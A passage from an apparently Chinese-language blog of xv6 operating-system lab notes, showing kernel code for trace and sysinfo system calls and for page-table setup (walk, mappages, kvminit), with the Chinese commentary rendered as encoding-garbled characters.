class="line"><span class="function"><span class="title">sys_trace</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  <span class="keyword">if</span>(argint(<span class="number">0</span>,&amp;mask)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  p-&gt;trace_num=mask;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Sysinfo"><a href="#Sysinfo" class="headerlink" title="Sysinfo"></a>Sysinfo</h4><p>è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ä¸ªå°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œé¦–å…ˆå¾—æŠŠç»“æ„ä½“ä»<code>struct sysinfo</code>ä»å†…æ ¸æ€æ‹·è´å›ç”¨æˆ·ç©ºé—´ï¼Œç„¶åå¾—åœ¨å†…æ ¸è·å¾—ç©ºé—²å†…å­˜é‡ï¼Œç„¶åè¿˜å¾—è·å¾—<code>stat</code>ä¸ä¸º<code>UNUSED</code>çš„è¿›ç¨‹æ•°ã€‚éƒ½æ²¡æ€ä¹ˆå¬è¿‡ï¼Œå¾—é˜…è¯»æºç æ…¢æ…¢ææ¸…æ¥šã€‚</p>
<p>ä»å†…æ ¸æ€æ‹·è´æ•°æ®ä½¿ç”¨çš„æ˜¯<code>copyout</code>å‡½æ•°,ä¹‹å‰åˆ†æè¿‡<code>copyin</code>å‡½æ•°ï¼ŒåŸç†éƒ½æ˜¯å·®ä¸å¤šçš„ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">copyout</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable, uint64 dstva, <span class="keyword">char</span> *src, uint64 len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(dstva);</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    n = PGSIZE - (dstva - va0);</span><br><span class="line">    <span class="keyword">if</span>(n &gt; len)</span><br><span class="line">      n = len;</span><br><span class="line">    memmove((<span class="keyword">void</span> *)(pa0 + (dstva - va0)), src, n);</span><br><span class="line"></span><br><span class="line">    len -= n;</span><br><span class="line">    src += n;</span><br><span class="line">    dstva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è·å¾—å†…å­˜ç©ºé—²å­—èŠ‚è¯¾ä»¥é€šè¿‡é˜…è¯»<code>kmalloc.c</code>æºç å¾ˆå¥½çš„è§£å†³,åœ¨xv6ç³»ç»Ÿä¸­å®šä¹‰äº†ä¸¤ä¸ªç»“æ„ä½“æ¥ç®¡ç†ç©ºé—²é¡µé¢å…¶ä¸­é€šè¿‡<code>struct run</code>ç»„æˆä¸€ä¸ªå•å‘é“¾è¡¨æ¥é“¾æ¥æ‰€æœ‰çš„ç©ºé—²é“¾è¡¨ï¼Œç„¶åé€šè¿‡<code>struct kmem.freelist</code>æŒ‡å‘è¿™ä¸ªé“¾è¡¨çš„å¤´ç»“ç‚¹ï¼Œæ‰€ä»¥åªéœ€è¦éå†è¿™ä¸ªé“¾è¡¨å°±å¯ä»¥æ‰€æœ‰ç©ºé—²é¡µé¢äº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">run</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">&#125; kmem;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>struct proc</code>ä¸­æœ‰ä¸€ä¸ªå­—æ®µ<code>struct proc *parent</code>å¯ä»¥é€šè¿‡éå†è¿™ä¸ªå­—æ®µå®Œæˆå¯¹è¿›ç¨‹æ•°çš„ç»Ÿè®¡ï¼Œè¿™ç§ç»Ÿè®¡æ–¹å¼è‚¯å®šæœ‰é—®é¢˜ï¼Œå› ä¸ºä¸€ä¸ªè¿›ç¨‹å¯ä»¥æœ‰å¤šä¸ªå­è¿›ç¨‹ï¼Œè¿™ä¸ªåŠæ³•æ¯ä¸€å±‚è¿›ç¨‹åªèƒ½éå†ä¸€ä¸ªï¼Œä¸å…¶è¯´ç»Ÿè®¡æœ‰å¤šå°‘ä¸ªè¿›ç¨‹ï¼Œä¸å¦‚è¯´ç»Ÿè®¡æœ‰å¤šå°‘å±‚è¿›ç¨‹ï¼Œå½“ç„¶è¿™ä¹Ÿæ˜¯<code>struct proc</code>çš„è®¾è®¡é—®é¢˜ï¼Œåªèƒ½è¿™æ ·å¹²ã€‚</p>
<p>ä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_sysinfo</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span> <span class="title">info</span>;</span></span><br><span class="line">  uint64 user_info;</span><br><span class="line">  <span class="keyword">if</span>(argaddr(<span class="number">0</span>,&amp;user_info)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sysinfo addr get fail\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  info.freemem=countfree();</span><br><span class="line">  info.nproc=get_proc_num();</span><br><span class="line">  <span class="keyword">if</span>(copyout(p-&gt;pagetable,user_info,(<span class="keyword">char</span> *)&amp;info,<span class="keyword">sizeof</span>(info))&lt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> </span></span><br><span class="line"><span class="function"><span class="title">countfree</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n=<span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  r=kmem.freelist;</span><br><span class="line">  <span class="keyword">while</span>(r)&#123;</span><br><span class="line">    <span class="comment">// printf(&quot;page_addr:%p\n&quot;,r);</span></span><br><span class="line">    n=n+<span class="number">4096</span>;</span><br><span class="line">    r=r-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_proc_num</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(p-&gt;parent)&#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;state!=UNUSED)&#123;</span><br><span class="line">      num++;</span><br><span class="line">    &#125;</span><br><span class="line">    p=p-&gt;parent;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="å¾—åˆ†"><a href="#å¾—åˆ†" class="headerlink" title="å¾—åˆ†"></a>å¾—åˆ†</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Score: 35/35</span><br></pre></td></tr></table></figure>

<h4 id="ç»“è¯­-1"><a href="#ç»“è¯­-1" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h4><p>å¯¹ç³»ç»Ÿè°ƒç”¨ç†è§£çš„æ›´æ·±äº†å§ï¼Œä¹‹å‰åªçŸ¥é“å¤§æ¦‚æ€æƒ³ï¼Œç°åœ¨ä¹ŸçŸ¥é“äº†å¦‚ä½•å®ç°çš„ï¼Œä¹Ÿå¯¹xv6çš„ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„åˆ‡æ¢æ›´åŠ ç†Ÿæ‚‰ï¼Œä¹Ÿæ›´åŠ äº†è§£äº†xv6çš„æºä»£ç ã€‚</p>
<h2 id="Lab3-page-tables"><a href="#Lab3-page-tables" class="headerlink" title="Lab3: page tables"></a>Lab3: page tables</h2><h3 id="code-read"><a href="#code-read" class="headerlink" title="code-read"></a>code-read</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//walkå‡½æ•°åœ¨è™šæ‹Ÿåœ°å€æœºåˆ¶ä¸­æ˜¯æ¯”è¾ƒé‡è¦çš„å‡½æ•°ï¼Œä»–æœ‰ä¸¤ç§ä½œç”¨ï¼Œå½“allocä¸º0çš„æ—¶å€™walkå‡½æ•°å°±æ˜¯å•çº¯çš„é€šè¿‡é¡µè¡¨å’Œè™šæ‹Ÿåœ°å€æ‰¾åˆ°è™šæ‹Ÿåœ°å€å¯¹åº”çš„ç¬¬ä¸‰çº§é¡µè¡¨å¯¹åº”çš„pteåœ°å€ï¼Œå½“allocä¸º0çš„æ—¶å€™å°±å¯ä»¥é€šè¿‡kallocå®Œæˆå¯¹é¡µè¡¨é¡¹å’Œé¡µè¡¨çš„å¢åŠ ã€‚ä½†ä¸ç®¡allocæ˜¯ä»€ä¹ˆå€¼ï¼Œè¿”å›çš„éƒ½æ˜¯å¯¹åº”çš„pteåœ°å€ï¼Œè€Œä¸æ˜¯å¯¹åº”çš„ç‰©ç†åœ°å€</span></span><br><span class="line"><span class="comment">//å½“ç„¶è¿™ä¸€åˆ‡éƒ½æ˜¯ä¾èµ–äºè™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€çš„ç›´æ¥æ˜ å°„ï¼Œä¸ç„¶walkæŸ¥åˆ°çš„é¡µè¡¨åœ°å€ç›´æ¥æ˜¯ç‰©ç†åœ°å€ï¼Œåœ¨æ“ä½œç³»ç»Ÿå±‚é¢æ— æ³•å†å¾€ä¸‹æŸ¥æ‰¾äº†</span></span><br><span class="line">walk(<span class="keyword">pagetable_t</span> pagetable, uint64 va, <span class="keyword">int</span> alloc)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(va &gt;= MAXVA)</span><br><span class="line">    panic(<span class="string">&quot;walk&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> level = <span class="number">2</span>; level &gt; <span class="number">0</span>; level--) &#123;</span><br><span class="line">    <span class="keyword">pte_t</span> *pte = &amp;pagetable[PX(level, va)];</span><br><span class="line">    <span class="keyword">if</span>(*pte &amp; PTE_V) &#123;</span><br><span class="line">      pagetable = (<span class="keyword">pagetable_t</span>)PTE2PA(*pte);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span>(!alloc || (pagetable = (<span class="keyword">pde_t</span>*)kalloc()) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">memset</span>(pagetable, <span class="number">0</span>, PGSIZE);</span><br><span class="line">      *pte = PA2PTE(pagetable) | PTE_V;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &amp;pagetable[PX(<span class="number">0</span>, va)];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿™ä¸ªå‡½æ•°æ˜¯æ¯”è¾ƒå…³é”®çš„è®¾ç½®é¡µè¡¨ï¼Œå¢åŠ é¡µè¡¨é¡¹çš„å‡½æ•°ï¼Œé¦–å…ˆé€šè¿‡è°ƒç”¨walkå‡½æ•°å¾—åˆ°pteçš„åœ°å€ï¼Œç„¶åæŠŠå¯¹åº”çš„paå¡«å…¥é¡µè¡¨é¡¹ï¼Œä¸€ç›´é‡å¤æ“ä½œç›´åˆ°éœ€è¦æ˜ å°„çš„åœ°å€è¢«æ˜ å°„å®Œ</span></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">mappages</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable, uint64 va, uint64 size, uint64 pa, <span class="keyword">int</span> perm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint64 a, last;</span><br><span class="line">  <span class="keyword">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">  a = PGROUNDDOWN(va);</span><br><span class="line">  last = PGROUNDDOWN(va + size - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    <span class="keyword">if</span>((pte = walk(pagetable, a, <span class="number">1</span>)) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(*pte &amp; PTE_V)</span><br><span class="line">      panic(<span class="string">&quot;remap&quot;</span>);</span><br><span class="line">    *pte = PA2PTE(pa) | perm | PTE_V;</span><br><span class="line">    <span class="keyword">if</span>(a == last)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    a += PGSIZE;</span><br><span class="line">    pa += PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯¹ä¸Šä¸€ä¸ªå‡½æ•°çš„å°è£…</span></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kvmmap</span><span class="params">(uint64 va, uint64 pa, uint64 sz, <span class="keyword">int</span> perm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(mappages(kernel_pagetable, va, sz, pa, perm) != <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;kvmmap&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ¯”è¾ƒé‡è¦çš„ä¸€ä¸ªå‡½æ•°ï¼Œä¸»è¦æ˜¯å®Œæˆå¯¹å†…æ ¸é¡µè¡¨çš„æ˜ å°„ï¼Œå‰é¢çš„ä¸€äº›æ˜ å°„å¡ä¸æ‡‚æï¼Œä½†æ˜¯åé¢ä¸‰ä¸ªå°±æ˜¯test,dataä»¥åŠé™·é˜±å¸§çš„æ˜ å°„ã€‚</span></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kvminit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  kernel_pagetable = (<span class="keyword">pagetable_t</span>) kalloc();</span><br><span class="line">  <span class="built_in">memset</span>(kernel_pagetable, <span class="number">0</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// uart registers</span></span><br><span class="line">  kvmmap(UART0, UART0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// virtio mmio disk interface</span></span><br><span class="line">  kvmmap(VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// CLINT</span></span><br><span class="line">  kvmmap(CLINT, CLINT, <span class="number">0x10000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// PLIC</span></span><br><span class="line">  kvmmap(PLIC, PLIC, <span class="number">0x400000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// map kernel text executable and read-only.</span></span><br><span class="line">  kvmmap(KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// map kernel data and the physical RAM we&#x27;ll make use of.</span></span><br><span class="line">  kvmmap((uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// map the trampoline for trap entry/exit to</span></span><br><span class="line">  <span class="comment">// the highest virtual address in the kernel.</span></span><br><span class="line">  kvmmap(TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¯»å®Œä»£ç åæ„Ÿè§‰å†…æ ¸å¹¶ä¸æ˜¯ç›´æ¥è¿è¡Œåœ¨ç‰©ç†å†…å­˜ä¸Šçš„ï¼Œä»–ä¹Ÿéµå¾ªè™šæ‹Ÿå†…å­˜ï¼Œæ‰€ä»¥è¦æ§åˆ¶æ•´ä¸ªç‰©ç†å†…å­˜çš„è¯å°±éœ€è¦ä¸€æ®µè™šæ‹Ÿåœ°å€å¯¹æ•´ä¸ªç‰©ç†å†…å­˜è¿›è¡Œæ˜ å°„ï¼Œé€šè¿‡è¿™æ®µè™šæ‹Ÿåœ°å€æ§åˆ¶æ•´ä¸ªç‰©ç†å†…å­˜ã€‚</p>
<h3 id="book-read-3"><a href="#book-read-3" class="headerlink" title="book-read"></a>book-read</h3><h4 id="åˆ›å»ºä¸€ä¸ªåœ°å€ç©ºé—´"><a href="#åˆ›å»ºä¸€ä¸ªåœ°å€ç©ºé—´" class="headerlink" title="åˆ›å»ºä¸€ä¸ªåœ°å€ç©ºé—´"></a>åˆ›å»ºä¸€ä¸ªåœ°å€ç©ºé—´</h4><p>åœ¨å†…æ ¸å¯åŠ¨çš„æ—¶å€™ï¼Œé¦–å…ˆä¼šè°ƒç”¨mainå‡½æ•°ï¼Œmainä¼šè°ƒç”¨ä¸Šè¿°ä»‹ç»çš„<code>kvminit</code>æ¥åˆå§‹åŒ–å†…æ ¸é¡µè¡¨ï¼Œ<code>kvminit</code>å·²ç»åˆ†æè¿‡äº†ï¼Œæ¥ç€çœ‹<code>kvminithart</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(cpuid() == <span class="number">0</span>)&#123;</span><br><span class="line">    consoleinit();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(LAB_PGTBL) || defined(LAB_LOCK)</span></span><br><span class="line">    statsinit();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    printfinit();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;xv6 kernel is booting\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    kinit();         <span class="comment">// physical page allocator</span></span><br><span class="line">    kvminit();       <span class="comment">// create kernel page table</span></span><br><span class="line">    kvminithart();   <span class="comment">// turn on paging</span></span><br><span class="line">    procinit();      <span class="comment">// process table</span></span><br><span class="line">    trapinit();      <span class="comment">// trap vectors</span></span><br><span class="line">    trapinithart();  <span class="comment">// install kernel trap vector</span></span><br><span class="line">    plicinit();      <span class="comment">// set up interrupt controller</span></span><br><span class="line">    plicinithart();  <span class="comment">// ask PLIC for device interrupts</span></span><br><span class="line">    binit();         <span class="comment">// buffer cache</span></span><br><span class="line">    iinit();         <span class="comment">// inode cache</span></span><br><span class="line">    fileinit();      <span class="comment">// file table</span></span><br><span class="line">    virtio_disk_init(); <span class="comment">// emulated hard disk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> LAB_NET</span></span><br><span class="line">    pci_init();</span><br><span class="line">    sockinit();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>    </span></span><br><span class="line">    userinit();      <span class="comment">// first user process</span></span><br><span class="line">    __sync_synchronize();</span><br><span class="line">    started = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(started == <span class="number">0</span>)</span><br><span class="line">      ;</span><br><span class="line">    __sync_synchronize();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hart %d starting\n&quot;</span>, cpuid());</span><br><span class="line">    kvminithart();    <span class="comment">// turn on paging</span></span><br><span class="line">    trapinithart();   <span class="comment">// install kernel trap vector</span></span><br><span class="line">    plicinithart();   <span class="comment">// ask PLIC for device interrupts</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  scheduler();        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¸€ä¸ªå‡½æ•°è®¾ç½®å¥½å†…æ ¸é¡µè¡¨ä¹‹åï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯è®©<code>satp</code>å¯„å­˜å™¨æŒ‡å‘è¿™ä¸ªé¡µè¡¨ï¼Œåˆ°è¿™é‡Œcpuæ‰å¼€å¯äº†è™šæ‹Ÿå†…å­˜ï¼Œä¹‹å‰å…¨éƒ¨éƒ½æ˜¯ç›´æ¥åœ¨ç‰©ç†å†…å­˜ä¸Šå¹²çš„ã€‚</p>
<p>å½“å¼€å§‹è™šæ‹Ÿåœ°å€ä¹‹å‰ï¼Œpcå¯„å­˜å™¨è®°å½•ç€ä¸‹ä¸€ä¸ªæŒ‡ä»¤çš„ç‰©ç†åœ°å€ï¼Œå½“å¼€å¯äº†ä¹‹åï¼Œpcå¯„å­˜å™¨å°±è®°å½•ç€ä¸‹ä¸€ä¸ªæŒ‡ä»¤çš„è™šæ‹Ÿåœ°å€ï¼Œå°±éœ€è¦ç¿»è¯‘äº†ï¼Œä½†ç”±äºxv6æ“ä½œç³»ç»Ÿæ˜¯é‡‡ç”¨ç›´æ¥æ˜ å°„çš„ï¼Œæ‰€ä»¥å¼€äº†å’Œæ²¡å¼€å·®ä¸å¤šâœŒ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kvminithart()</span><br><span class="line">&#123;</span><br><span class="line">  w_satp(MAKE_SATP(kernel_pagetable));</span><br><span class="line">  sfence_vma();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååˆè°ƒç”¨<code>procinit</code>å‡½æ•°,è¿™ä¸ªå‡½æ•°å°±æ˜¯éå†æ‰€æœ‰çš„è¿›ç¨‹çš„procç»“æ„ä½“ï¼Œç„¶ååˆ©ç”¨kallocç”³è¯·ä¸€ä¸ªé¡µè¡¨ï¼Œä¸è¿‡æˆ‘ç¨å¾®æœ‰é—®é¢˜çš„å°±æ˜¯kallocè¿”å›çš„æ˜¯è™šæ‹Ÿåœ°å€ï¼Œè™½è¯´æ˜¯ç›´æ¥æ˜ å°„ï¼Œä½†æ˜¯ä»–ç›´æ¥é»˜è®¤æˆç‰©ç†åœ°å€äº†ï¼Œè¿˜æ˜¯ä¸å¤ªä¸¥è°¨ï¼Œå®¹æ˜“äº§ç”Ÿè¯¯å¯¼ã€‚ç„¶ååˆ©ç”¨<code>KSTACK</code>è®¡ç®—å‡ºè¿™ä¸ªè¿›ç¨‹çš„å†…æ ¸æ ˆçš„è™šæ‹Ÿåœ°å€ï¼Œç„¶åè°ƒç”¨<code>kvmmap</code>è¿›è¡Œæ˜ å°„ã€‚</p>
<p>é€€å‡ºforå¾ªç¯ä¹‹åè¿˜å¾—è°ƒç”¨<code>kvminithart</code>å‡½æ•°ï¼Œå› ä¸ºå·²ç»æ›´æ”¹äº†é¡µè¡¨ï¼Œå°±å¿…é¡»åˆ·æ–°TLBï¼Œä¸ç„¶å¯èƒ½ä¼šæ˜ å°„å‡ºé”™ï¼Œè€Œè¿™ä¸ªå‡½æ•°ä¸­çš„<code>sfence_vma</code>å‡½æ•°è°ƒç”¨ä¼šæ‰§è¡Œ<code>sfence.vma</code>æŒ‡ä»¤ï¼Œè¿™ä¸ªæŒ‡ä»¤å°±ä¼šåˆ·æ–°TLB</p>
